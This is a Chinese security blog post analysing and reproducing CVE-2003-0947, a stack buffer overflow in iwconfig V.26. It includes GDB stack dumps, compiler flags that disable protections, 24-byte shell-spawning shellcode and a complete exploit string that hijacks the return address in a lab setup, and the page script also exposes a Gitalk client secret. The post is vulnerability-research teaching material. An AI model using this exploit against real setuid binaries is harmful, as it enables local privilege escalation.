<!DOCTYPE html><html lang="zh-CN"><head><meta name="generator" content="Hexo 3.8.0"><meta http-equiv="content-type" content="text/html; charset=utf-8"><meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport"><meta content="yes" name="apple-mobile-web-app-capable"><meta content="black-translucent" name="apple-mobile-web-app-status-bar-style"><meta content="telephone=no" name="format-detection"><meta name="description" content="CVE Binary PWN hacker web security angr rex ida hack code python github hexo"><title>iwconfig 缓冲区溢出分析及复现（CVE-2003-0947） | Mr.Ma3k4H3d</title><link rel="stylesheet" type="text/css" href="/css/style.css?v=0.0.0"><link rel="stylesheet" type="text/css" href="//cdn.bootcss.com/normalize/8.0.0/normalize.min.css"><link rel="stylesheet" type="text/css" href="//cdn.bootcss.com/pure/1.0.0/pure-min.css"><link rel="stylesheet" type="text/css" href="//cdn.bootcss.com/pure/1.0.0/grids-responsive-min.css"><link rel="stylesheet" href="//cdn.bootcss.com/font-awesome/4.7.0/css/font-awesome.min.css"><script type="text/javascript" src="//cdn.bootcss.com/jquery/3.3.1/jquery.min.js"></script><link rel="Shortcut Icon" type="image/x-icon" href="/favicon.ico"><link rel="apple-touch-icon" href="/apple-touch-icon.png"><link rel="apple-touch-icon-precomposed" href="/apple-touch-icon.png"><link rel="alternate" type="application/atom+xml" href="/atom.xml"></head><body><div class="body_container"><div id="header"><div class="site-name"><h1 class="hidden">iwconfig 缓冲区溢出分析及复现（CVE-2003-0947）</h1><a id="logo" href="/.">Mr.Ma3k4H3d</a><p class="description">竹杖芒鞋轻胜马，一蓑烟雨任平生。</p></div><div id="nav-menu"><a class="current" href="/."><i class="fa fa-home"> 首页</i></a><a href="https://micro8.github.io/Micro8-HTML/"><i class="fa fa-archive"> Micro8</i></a><a href="https://ma3k4h3d.top/Papers/"><i class="fa fa-archive"> Papers</i></a><a href="/archives/"><i class="fa fa-archive"> 归档</i></a><a href="https://book.douban.com/annual/2018?source=navigation"><i class="fa fa-archive"> 好书精选</i></a><a href="/history/"><i class="fa fa-user"> 关于</i></a></div></div><div class="pure-g" id="layout"><div class="pure-u-1 pure-u-md-3-4"><div class="content_container"><div class="post"><h1 class="post-title">iwconfig 缓冲区溢出分析及复现（CVE-2003-0947）</h1><div class="post-meta">Mar 14, 2019<span> | </span><span class="category"><a href="/categories/漏洞分析/">漏洞分析</a></span><script src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js" async></script><span id="busuanzi_container_page_pv"> | <span id="busuanzi_value_page_pv"></span><span> 阅读</span></span><span class="post-time"><span class="post-meta-item-text"> | </span><span class="post-meta-item-icon"><i class="fa fa-keyboard-o"></i><span class="post-count"> 1.1k</span><span class="post-meta-item-text"> 字</span></span></span><span class="post-time"> | <span class="post-meta-item-icon"><i class="fa fa-hourglass-half"></i><span class="post-count"> 4</span><span class="post-meta-item-text"> 分钟</span></span></span></div><div class="post-content"><blockquote>
<p>iwconfig 是 Linux Wireless Extensions(LWE) 的用户层配置工具之一。LWE 是 Linux 下对无线网络配置的工具，包括内核的支持、用户层配置工具和驱动接口的支持三部分。<br>目前很多无线网卡都支持 LWE，而且主流的 Linux 发布版本，比如 Redhat Linux、Ubuntu Linux 都已经带了这个配置工具。</p>
</blockquote>
<p align="right"> –《百度百科》 </p>

<a id="more"></a>
<h2 id="0x00-漏洞描述"><a href="#0x00-漏洞描述" class="headerlink" title="0x00 漏洞描述"></a>0x00 漏洞描述</h2><p>待分析的 iwconfig V.26 存在两个漏洞，分别为 CVE-2003-0947、CVE-2003-0948。此次主要对 CVE-2003-0947 进行分析。</p>
<p><img src="/2019/03/14/CVE-2003-0947/iwconfig-cve_min.png" alt="">  </p>
<p>漏洞描述如下：</p>
<blockquote>
<p>Buffer overflow in iwconfig, when installed setuid, allows local users to execute arbitrary code via a long OUT environment variable.</p>
</blockquote>
<ul>
<li><p>CVSS 评分：<br><img src="/2019/03/14/CVE-2003-0947/CVSS_min.png" alt=""></p>
</li>
<li><p>影响版本：<br><img src="/2019/03/14/CVE-2003-0947/scope_min.png" alt=""></p>
</li>
</ul>
<h2 id="0x01-CVE-2003-0947-漏洞原理"><a href="#0x01-CVE-2003-0947-漏洞原理" class="headerlink" title="0x01 CVE-2003-0947 漏洞原理"></a>0x01 CVE-2003-0947 漏洞原理</h2><h3 id="1、源码"><a href="#1、源码" class="headerlink" title="1、源码"></a>1、源码</h3><p>导致漏洞产生的原因是，位于 iwconfig.c 中的 get_info() 函数在调用 strcpy() 时，未检查缓冲区大小，导致栈溢出。如下图所示，蓝色箭头表示从 main() 函数开始至溢出点的函数调用过程，红色箭头表示输入数据的传递过程，左下方绿色区域为结构体 ifreq 定义，右下方为 iw_get_ext() 函数体。</p>
<p><img src="/2019/03/14/CVE-2003-0947/code_min.jpg" alt=""></p>
<p>对溢出点 strcpy(ifr.ifr_name, ifname) 进行分析。ifname 为输入参数 argv[1] 传递所得，在整个传参过程中，程序未对其进行任何检查。查看系统对结构体 ifreq 的定义，可见 ifr.ifr_name 的大小为 16 字节。意味着，只要使得输入参数 argv[1] 远大于 16 字节，即可造成缓冲区溢出，使程序崩溃。<br>注意：在到达溢出点前，需要调用 iw_get_ext(skfd, ifname, SIOCGIWNAME, &amp;wrq) 函数，由于传入的 ifname 为无意义数据，使得 iw_get_ext(skfd, ifname, SIOCGIWNAME, &amp;wrq) 返回值为 -1，因此能够进入存在漏洞的分支路径中。</p>
<h3 id="2、汇编"><a href="#2、汇编" class="headerlink" title="2、汇编"></a>2、汇编</h3><p>基于汇编代码，对溢出点进一步分析。由下图可知，系统为 get_info() 分配空间 0x70，ifr.ifr_name 所在地址为 rbp-0x50。因此，构造 PoC 为 ‘A’ * 80 + ‘RBP’ + ‘RIP’，即可导致程序崩溃。  </p>
<p><img src="/2019/03/14/CVE-2003-0947/asm_min.png" alt=""></p>
<h3 id="3、Debug"><a href="#3、Debug" class="headerlink" title="3、Debug"></a>3、Debug</h3><p>基于以上分析，构造 PoC 为 python -c ‘print “A”*88 + “BBBBBB”‘，并通过 GDB 进行验证。<br>在 &lt; get_info + 82 > 处设置断点，即溢出点前：</p>
<p><img src="/2019/03/14/CVE-2003-0947/stack_min.png" alt="">  </p>
<p>此时，RSP=0x7fffffffdf80、RBP=0x7fffffffdff0，ifr.ifr_name 地址为 0x7fffffffdfa0，查看栈空间如下。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/20gx <span class="variable">$rsp</span></span><br><span class="line">0x7fffffffdf80:	0x00000000ffffffff	0x00007fffffffe020</span><br><span class="line">0x7fffffffdf90:	0x00007fffffffe747	0x00000003f7fe74e0</span><br><span class="line">0x7fffffffdfa0:	0x00007fffffffe3d0	0x0000000000401010</span><br><span class="line">0x7fffffffdfb0:	0x00007fffffffe4e0	0x0000000000000000</span><br><span class="line">0x7fffffffdfc0:	0x0000000000000000	0x00007ffff7de4ec3</span><br><span class="line">0x7fffffffdfd0:	0x4141414141414141	0x4141414141414141</span><br><span class="line">0x7fffffffdfe0:	0x00007fffffffe400	0x0000000000401010</span><br><span class="line">0x7fffffffdff0:	0x00007fffffffe3d0	0x000000000040244b</span><br><span class="line">0x7fffffffe000:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x7fffffffe010:	0x00007fffffffe747	0x0000000300000000</span><br></pre></td></tr></table></figure>
<p>单步调试至触发溢出。  </p>
<p><img src="/2019/03/14/CVE-2003-0947/stack_smash_min.png" alt=""></p>
<p>再次查看栈空间，可见 0x7fffffffdff0 处的 RBP 已被覆盖为 0x4141414141414141，0x7fffffffdff8 处的 RIP 被覆盖为 0x0000424242424242。  </p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/20gx <span class="variable">$rsp</span></span><br><span class="line">0x7fffffffdf80:	0x00000000ffffffff	0x00007fffffffe020</span><br><span class="line">0x7fffffffdf90:	0x00007fffffffe747	0x00000003f7fe74e0</span><br><span class="line">0x7fffffffdfa0:	0x4141414141414141	0x4141414141414141</span><br><span class="line">0x7fffffffdfb0:	0x4141414141414141	0x4141414141414141</span><br><span class="line">0x7fffffffdfc0:	0x4141414141414141	0x4141414141414141</span><br><span class="line">0x7fffffffdfd0:	0x4141414141414141	0x4141414141414141</span><br><span class="line">0x7fffffffdfe0:	0x4141414141414141	0x4141414141414141</span><br><span class="line">0x7fffffffdff0:	0x4141414141414141	0x0000424242424242</span><br><span class="line">0x7fffffffe000:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x7fffffffe010:	0x00007fffffffe747	0x0000000300000000</span><br></pre></td></tr></table></figure>
<p>执行至 get_info() 返回，抛出异常，RIP 已被劫持为 0x424242424242。</p>
<p><img src="/2019/03/14/CVE-2003-0947/crash_min.png" alt="">  </p>
<h2 id="0x02-Exploit"><a href="#0x02-Exploit" class="headerlink" title="0x02 Exploit"></a>0x02 Exploit</h2><p>本文侧重点在于分析漏洞成因，不过多涉及 Exploit 编写技术。在此选用 ret2text 的方式，仅以验证为目的。</p>
<h3 id="1、实验环境"><a href="#1、实验环境" class="headerlink" title="1、实验环境"></a>1、实验环境</h3><p>修改原 Makefile 文件中的 gcc 选项，关闭安全机制：  </p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># CFLAGS=-O2 -W -Wall -Wstrict-prototypes</span></span><br><span class="line">CFLAGS=-W -Wall -g -z execstack -fno-stack-protector -no-pie -z norelro</span><br></pre></td></tr></table></figure>
<ul>
<li>-O2 选项会对代码进行优化，在 gcc 7.3.0 下会开启 FORTIFY，因此关闭该选项  </li>
<li>-z execstack，关闭 NX  </li>
<li>-fno-stack-protector，关闭 Canary  </li>
<li>-no-pie，关闭 PIE  </li>
<li>-z norelro，关闭 RELRO  </li>
<li>-g， Debug 模式</li>
</ul>
<p>checksec 结果如下：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">$ checksec iwconfig</span><br><span class="line">[*] <span class="string">'/root/AEG_DataSet/wireless_tools.26/iwconfig'</span></span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    No RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX disabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br><span class="line">    RWX:      Has RWX segments</span><br></pre></td></tr></table></figure></p>
<p>使用 shellcode 如下，功能为调用 /bin/bash，共计 24 字节。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">// 调用 /bin/bash (<span class="number">24</span> byte)</span><br><span class="line">shellcode = <span class="string">'\x6a\x3b\x58\x99\x52\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x53\x54\x5f\x52\x57\x54\x5e\x0f\x05'</span></span><br></pre></td></tr></table></figure></p>
<h3 id="2、GDB"><a href="#2、GDB" class="headerlink" title="2、GDB"></a>2、GDB</h3><p>基于以上分析可知，ifr.ifr_name 地址为 0x7fffffffdfa0，与 RIP 之间的偏移量为 88，使用 0x7fffffffdfa0 作为返回地址，构造 Exp 如下：<br>(python -c “print ‘\x6a\x3b\x58\x99\x52\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x53\x54\x5f\x52\x57\x54\x5e\x0f\x05’ + ‘A’*64 + ‘\xa0\xdf\xff\xff\xff\x7f\x00\x00’”)。<br>将 Exploit 传入 GDB，并触发漏洞：  </p>
<p><img src="/2019/03/14/CVE-2003-0947/gdb_exp_min.png" alt=""></p>
<p>执行至 get_info() 返回，成功劫持控制流，并执行 shellcode。  </p>
<p><img src="/2019/03/14/CVE-2003-0947/gdb_exp_success_min.png" alt=""></p>
<p>至此，完成了对 CVE-2003-0947 的分析，并在实验环境下编写了 Exploit。</p>
<h2 id="参考文献："><a href="#参考文献：" class="headerlink" title="参考文献："></a>参考文献：</h2><ol>
<li><a href="https://hewlettpackard.github.io/wireless-tools/Tools.html" target="_blank" rel="noopener">iwconfig V.26下载地址</a></li>
<li><a href="https://www.cvedetails.com/cve/CVE-2003-0947/" target="_blank" rel="noopener">Vulnerability Details : CVE-2003-0947</a></li>
<li><a href="https://www.securityfocus.com/bid/82721/info" target="_blank" rel="noopener">SecurityFocus: iwconfig CVE-2003-0947 Local Security Vulnerability</a></li>
<li><a href="https://introspelliam.github.io/2017/09/30/linux程序的常用保护机制/" target="_blank" rel="noopener">linux程序的常用保护机制</a>  </li>
<li><a href="https://www.exploit-db.com/exploits/23301" target="_blank" rel="noopener">Wireless Tools 26 (IWConfig) - ARGV Local Command Line Buffer Overflow</a></li>
</ol>
</div><div><ul class="post-copyright"><li class="post-copyright-author"><strong>本文作者：</strong>Mr.Ma3k4H3d</li><li class="post-copyright-link"><strong>本文链接：</strong><a href="/2019/03/14/CVE-2003-0947/">http://maskhed.github.io/2019/03/14/CVE-2003-0947/</a></li><li class="post-copyright-license"><strong>版权声明：</strong>本博客所有文章除特别声明外，均采用 CC BY-NC-SA 4.0 CN 许可协议。转载请注明出处！</li></ul></div><br><div class="tags"></div><div class="post-nav"><a class="pre" href="/2020/12/08/风雨兼程/">即使风雨兼程，也能守得云开见月明</a><a class="next" href="/2019/03/06/PPT-test/">Baab through automatic exploit generation</a></div><div id="container"></div><link rel="stylesheet" type="text/css" href="//unpkg.com/gitalk/dist/gitalk.css?v=0.0.0"><script type="text/javascript" src="//cdn.bootcss.com/blueimp-md5/2.10.0/js/md5.js?v=0.0.0"></script><script type="text/javascript" src="//unpkg.com/gitalk/dist/gitalk.min.js?v=0.0.0"></script><script type="text/javascript" src="//cdn.bootcss.com/blueimp-md5/2.10.0/js/md5.js"></script><script>var gitalk = new Gitalk({
  clientID: '5a30c862e87dbcdd2992',
  clientSecret: 'e098ba3d824802e68648008f80b024617bd8a546',
  repo: 'ma3k4h3d.github.io',
  owner: 'Ma3k4H3d',
  admin: ['Ma3k4H3d'],
  id: md5(location.pathname),
  distractionFreeMode: false
})
gitalk.render('container')
</script></div></div></div><div class="pure-u-1-4 hidden_mid_and_down"><div id="sidebar"><div class="widget"><div class="search-form"><input id="local-search-input" placeholder="Search" type="text" name="q" results="0"><div id="local-search-result"></div></div></div><div class="widget"><div class="widget-title"><i class="fa fa-folder-o"> 分类</i></div><ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/AEG/">AEG</a><span class="category-list-count">5</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/Angr/">Angr</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/PWN/">PWN</a><span class="category-list-count">3</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/技术分享/">技术分享</a><span class="category-list-count">5</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/漏洞分析/">漏洞分析</a><span class="category-list-count">4</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/随笔杂谈/">随笔杂谈</a><span class="category-list-count">1</span></li></ul></div><div class="widget"><div class="widget-title"><i class="fa fa-star-o"> 标签</i></div><div class="tagcloud"><a href="/tags/Hexo/" style="font-size: 15px;">Hexo</a> <a href="/tags/CGC/" style="font-size: 15px;">CGC</a> <a href="/tags/CVE/" style="font-size: 15px;">CVE</a> <a href="/tags/Mr-Robot/" style="font-size: 15px;">Mr.Robot</a> <a href="/tags/SS/" style="font-size: 15px;">SS</a> <a href="/tags/Github/" style="font-size: 15px;">Github</a> <a href="/tags/Fuzz/" style="font-size: 15px;">Fuzz</a></div></div><div class="widget"><div class="widget-title"><i class="fa fa-file-o"> 最近文章</i></div><ul class="post-list"><li class="post-list-item"><a class="post-list-link" href="/2020/12/08/风雨兼程/">即使风雨兼程，也能守得云开见月明</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/03/14/CVE-2003-0947/">iwconfig 缓冲区溢出分析及复现（CVE-2003-0947）</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/03/06/PPT-test/">Baab through automatic exploit generation</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/01/23/rex-crash/">Rex：源码分析 -- Crash Analysis</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/01/17/Rex-stacksmash/">Rex AEG：栈溢出之 Exploit 自动生成</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/01/09/insomnihack-aeg/">angr AEG：缓冲区溢出之 Exploit 自动生成</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/12/20/Vulnerability-Analysis-Method/">软件漏洞分析</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/12/14/Pwnable-3/">Pwnable（三）</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/12/08/Pwnable-2/">Pwnable（二）</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/12/07/Pwnable-1/">Pwnable（一）</a></li></ul></div><div class="widget"><div class="widget-title"><i class="fa fa-external-link"> 友情链接</i></div><ul></ul><a href="http://www.t00ls.net/" title="T00ls" target="_blank">T00ls</a><ul></ul><a href="http://riusksk.me" title="riusksk" target="_blank">riusksk</a><ul></ul><a href="https://micropoor.blogspot.com" title="Micropoor" target="_blank">Micropoor</a><ul></ul><a href="http://www.cnblogs.com/backlion" title="Backlion" target="_blank">Backlion</a><ul></ul><a href="https://onebugman.com" title="OneBugMan" target="_blank">OneBugMan</a><ul></ul><a href="http://yama0xff.com" title="yama0xff.com" target="_blank">yama0xff.com</a><ul></ul><a href="https://musicforprogramming.net" title="musicforprogramming.net" target="_blank">musicforprogramming.net</a></div></div></div><div class="pure-u-1 pure-u-md-3-4"><div id="footer"><div>Total<span id="busuanzi_container_site_pv"><span> </span><span id="busuanzi_value_site_pv"></span></span><span rel="nofollow">  hits, </span><span id="busuanzi_container_site_uv"><span id="busuanzi_value_site_uv"></span></span><span rel="nofollow">  visitors. </span></div><div><script>var cnzz_protocol = (("https:" == document.location.protocol) ? " https://" : " http://");document.write(unescape("%3Cspan id='cnzz_stat_icon_1275288791'%3E%3C/span%3E%3Cscript src='" + cnzz_protocol + "s23.cnzz.com/z_stat.php%3Fid%3D1275288791%26online%3D1%26show%3Dline' type='text/javascript'%3E%3C/script%3E"));</script></div>Copyright © 2019 <a href="/." rel="nofollow">Mr.Ma3k4H3d.</a> Powered by<a rel="nofollow" target="_blank" href="https://hexo.io"> Hexo.</a><a rel="nofollow" target="_blank" href="https://github.com/tufu9441/maupassant-hexo"> Theme</a> by<a rel="nofollow" target="_blank" href="https://github.com/pagecho"> Cho.</a></div></div></div><a class="show" id="rocket" href="#top"></a><script type="text/javascript" src="/js/totop.js?v=0.0.0" async></script><script type="text/javascript" src="//cdn.bootcss.com/fancybox/3.3.5/jquery.fancybox.min.js" async></script><script type="text/javascript" src="/js/fancybox.js?v=0.0.0" async></script><link rel="stylesheet" type="text/css" href="//cdn.bootcss.com/fancybox/3.3.5/jquery.fancybox.min.css"><script src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" async></script><script type="text/javascript" src="/js/search.js?v=0.0.0"></script><script>var search_path = 'search.xml';
if (search_path.length == 0) {
   search_path = 'search.xml';
}
var path = '/' + search_path;
searchFunc(path, 'local-search-input', 'local-search-result');
</script><script type="text/javascript" color="208,55,66" opacity="0.3" zindex="-1" count="99" src="//cdn.bootcss.com/canvas-nest.js/1.0.1/canvas-nest.min.js"></script><script type="text/javascript" src="/js/codeblock-resizer.js?v=0.0.0"></script><script type="text/javascript" src="/js/smartresize.js?v=0.0.0"></script></div></body></html>